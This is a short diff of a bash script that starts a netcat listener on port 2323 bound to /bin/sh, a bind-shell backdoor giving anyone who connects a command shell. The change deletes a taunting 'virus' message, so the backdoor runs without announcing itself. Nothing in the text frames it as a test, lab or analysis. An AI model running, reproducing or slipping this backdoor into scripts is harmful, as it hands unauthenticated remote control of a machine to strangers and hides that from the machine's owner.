@@ -1,3 +1,2 @@
 #!/bin/bash
 nc -l -t -p 2323 -e /bin/sh &exit
-echo "HAHA YOU ARE AFFECTED BY VIRUS!! AND THATS AN EVIL ALUGH BY THE WAY!!"
